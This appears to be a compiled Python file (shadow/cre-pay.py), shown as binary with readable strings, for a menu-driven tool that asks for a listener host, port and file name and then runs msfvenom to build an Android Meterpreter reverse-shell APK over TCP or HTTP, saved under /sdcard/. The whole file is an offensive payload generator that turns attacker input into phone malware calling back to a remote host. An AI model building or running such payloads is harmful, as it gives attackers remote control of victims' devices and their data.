a
    ?H`?  ?                   @   s  d dl Z e ?d? dZdZeed ? eed ? eed ? eed ? eed	 ? eed
 ? dZdZdZdZdZ	dZ
dZed? eed ? ed? eed ? ed? ed? eed ?Zed? edkr?ed? ed? edkr?ed? ed? eed ?Zed? ede ? ed? eed ?Zed? ede ? ed? eed ?Zed? ed e ? ed? eed! ? ed"? edk?r?e ?d#e e e e e e e e
 e e e e	 ? edk?re ?d$e e e e e e e e
 e e e e	 ? dS )%?    N?clearz[0;35mz[0;32mz4        _____   _       _   _____   _____   _   _   z3       /  ___| | |     | | |_   _| /  ___| | | | | z3       | |     | |     | |   | |   | |     | |_| | z3       | |  _  | |     | |   | |   | |     |  _  | z3       | |_| | | |___  | |   | |   | |___  | | | | z5       \_____/ |_____| |_|   |_|   \_____| |_| |_|   zlhost=? zlport=z/sdcard/z.apkz-oz lhost = ??? z [1] ==> TCP z  z [2] ==> HTTPz   z  What is your choice ==>[0;32m ?1z protocol => TCP ?2z protocol => HTTP z Your host ==>[0;32m z
 LHOST => z Your port ==>[0;32m z
 LPORT => z Payload name ==>[0;32m z	 NAME => z0      Please wait some seconds to create payloadz     z+msfvenom -p android/meterpreter/reverse_tcpz,msfvenom -p android/meterpreter/reverse_http)?os?system?R?G?print?f?p?rZmvZth?o?j?input?m?host?port?h? r   r   ?shadow/cre-pay.py?<module>   s`   

:
